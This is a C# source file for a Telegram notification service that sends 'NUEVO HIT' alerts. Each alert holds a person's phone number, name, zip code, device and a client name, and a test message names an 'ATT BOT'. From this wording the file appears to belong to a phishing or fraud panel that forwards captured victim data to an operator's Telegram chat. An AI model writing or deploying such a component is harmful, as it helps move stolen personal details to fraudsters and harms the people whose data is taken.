using System.Text.Json;

namespace ClientAccess.Services
{
    public class TelegramService
    {
        private readonly ConfigService _configService = new ConfigService();
        private readonly HttpClient _httpClient = new HttpClient();

        public async Task SendHitNotification(string phoneNumber, string? fullName, string? deviceMessage, string? hitType, string? zipCode, string? clientName)
        {
            try
            {
                var config = await _configService.GetConfigAsync();
                var botToken = config.ContainsKey("TELEGRAM_BOT_TOKEN") ? config["TELEGRAM_BOT_TOKEN"] : "";
                var chatId = config.ContainsKey("TELEGRAM_CHAT_ID") ? config["TELEGRAM_CHAT_ID"] : "";

                if (string.IsNullOrWhiteSpace(botToken) || string.IsNullOrWhiteSpace(chatId))
                    return;

                var emoji = hitType == "HIT" ? "🔥" : "👀";
                var message = $"{emoji} <b>NUEVO HIT</b>\n\n"
                    + $"📞 <b>Teléfono:</b> {phoneNumber}\n"
                    + $"👤 <b>Nombre:</b> {fullName ?? "N/A"}\n"
                    + $"📮 <b>Zip:</b> {zipCode ?? "N/A"}\n"
                    + $"📱 <b>Dispositivo:</b> {deviceMessage ?? "N/A"}\n"
                    + $"🏷️ <b>Tipo:</b> {hitType ?? "N/A"}\n";

                if (!string.IsNullOrWhiteSpace(clientName))
                    message += $"👤 <b>Cliente:</b> {clientName}\n";

                var payload = new
                {
                    chat_id = chatId,
                    text = message,
                    parse_mode = "HTML"
                };

                var json = JsonSerializer.Serialize(payload);
                var content = new StringContent(json, System.Text.Encoding.UTF8, "application/json");
                var response = await _httpClient.PostAsync($"https://api.telegram.org/bot{botToken}/sendMessage", content);

                if (!response.IsSuccessStatusCode)
                {
                    var errorBody = await response.Content.ReadAsStringAsync();
                    Console.WriteLine($"Telegram error: {response.StatusCode} - {errorBody}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error sending Telegram notification: {ex.Message}");
            }
        }

        public async Task SendTestMessage()
        {
            try
            {
                var config = await _configService.GetConfigAsync();
                var botToken = config.ContainsKey("TELEGRAM_BOT_TOKEN") ? config["TELEGRAM_BOT_TOKEN"] : "";
                var chatId = config.ContainsKey("TELEGRAM_CHAT_ID") ? config["TELEGRAM_CHAT_ID"] : "";

                if (string.IsNullOrWhiteSpace(botToken) || string.IsNullOrWhiteSpace(chatId))
                    return;

                var payload = new
                {
                    chat_id = chatId,
                    text = "🤖 <b>ATT BOT</b>\n\n✅ Sistema conectado correctamente.\nNotificaciones activas.",
                    parse_mode = "HTML"
                };

                var json = JsonSerializer.Serialize(payload);
                var content = new StringContent(json, System.Text.Encoding.UTF8, "application/json");
                await _httpClient.PostAsync($"https://api.telegram.org/bot{botToken}/sendMessage", content);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error sending Telegram test: {ex.Message}");
            }
        }
    }
}
